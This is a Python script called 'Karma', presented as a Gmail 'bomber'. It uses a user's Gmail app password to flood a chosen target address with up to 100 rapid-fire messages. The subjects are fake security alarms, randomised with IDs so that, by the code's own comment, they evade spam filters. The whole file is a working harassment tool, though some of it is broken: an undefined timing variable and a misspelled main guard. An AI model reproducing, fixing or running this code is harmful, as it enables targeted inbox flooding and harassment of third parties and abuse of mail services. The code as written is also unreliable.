#!/usr/bin/env python3
"""
Welcome to Karma - the best gmail bomber
"""

import smtplib
import time
import random
import sys

def print_banner():
    print("""
 ____  __.                            
|    |/ _|____ _______  _____ _____   
|      < \__  \\_  __ \/     \\__  \  
|    |  \ / __ \|  | \/  Y Y  \/ __ \_
|____|__ (____  /__|  |__|_|  (____  /
        \/    \/            \/     \/ 
    """)

def rapid_bomb(gmail_user, gmail_pass, target_email, bomb_count):
    """
    Rapid bombing mode - maximum speed, minimum thinking
    """
    print(f"\n[*] Loading bomb payload...")
    print(f"[*] Target: {target_email}")
    print(f"[*] Bombs: {bomb_count}")
    print(f"[*] Firing in 3 seconds...\n")
    time.sleep(3)
    
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    
    bomb_success = 0
    bomb_failed = 0
    
    # Ultra rapid fire loop
    for bomb_num in range(1, bomb_count + 1):
        try:
            # Connect and login
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(gmail_user, gmail_pass)
            
            # Generate random subject to avoid spam filters
            random_id = random.randint(1000, 9999)
            subjects = [
                "URGENT: Immediate Action Required",
                "SECURITY ALERT: Account Compromise",
                "CONFIRMATION NEEDED: Verify Identity",
                "WARNING: System Failure Detected",
                "ATTENTION: Unusual Activity Found"
            ]
            subject = random.choice(subjects)
            
            # Create bomb message
            message = f"""Subject: {subject} - ID:{random_id}
From: {gmail_user}
To: {target_email}

Bomb #{bomb_num} successfully delivered.
Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}
Random Code: {random.randint(100000, 999999)}

This is an automated bombardment.
Target status: ANNIHILATED

"""
            
            # Launch bomb
            server.sendmail(gmail_user, target_email, message)
            server.quit()
            
            bomb_success += 1
            print(f"[BOMB #{bomb_num}] 💥 DIRECT HIT! Email delivered.")
            
            # Ultra short delay for maximum speed (0.1-0.3 seconds)
            time.sleep(random.uniform(0.1, 0.3))
            
        except Exception as e:
            bomb_failed += 1
            print(f"[BOMB #{bomb_num}] ❌ FAILED! Error: {str(e)}")
            time.sleep(1)  # Slightly longer delay on failure
    
    # Mission report
    print("\n" + "="*50)
    print("💣 BOMBING MISSION COMPLETE 💣")
    print("="*50)
    print(f"✅ Successful bombs: {bomb_success}")
    print(f"❌ Failed bombs: {bomb_failed}")
    print(f"🎯 Accuracy rate: {round((bomb_success/bomb_count)*100, 2)}%")
    print(f"⏱️ Total time: {round(time.time() - start_time, 2)} seconds")
    print("="*50)
    print("\nTarget mailbox status: ANNIHILATED")
    print("HahaIdiot protocol executed successfully.")
    print("Remember: You're an idiot, but at least you're effective.")

def main():
    print_banner()
    
    # EZ idiot mode - just ask for basic info
    print("\n[Karma is working - please wait]")
    
    gmail_user = input("[?] Your Gmail (must use APP PASSWORD): ")
    gmail_pass = input("[?] App Password (16 chars from Google): ")
    target_email = input("[?] Target email to bomb: ")
    
    # Default bomb count for idiots
    bomb_count = 20
    print(f"[*] Default bomb count: {bomb_count} (EZ mode choice)")
    
    # Optional: Let idiot choose count
    try:
        custom_count = input("[?] Want custom bomb count? (y/n): ")
        if custom_count.lower() == 'y':
            bomb_count = int(input("[?] How many bombs? (max 100 for EZ mode): "))
            if bomb_count > 100:
                print("[!] Too many for EZ mode, setting to 100")
                bomb_count = 100
    except:
        print("[!] Invalid input, using default 20 bombs")
    
    # Start bombing
    start_time = time.time()
    rapid_bomb(gmail_user, gmail_pass, target_email, bomb_count)

if _name_ == "_main_":
    main()
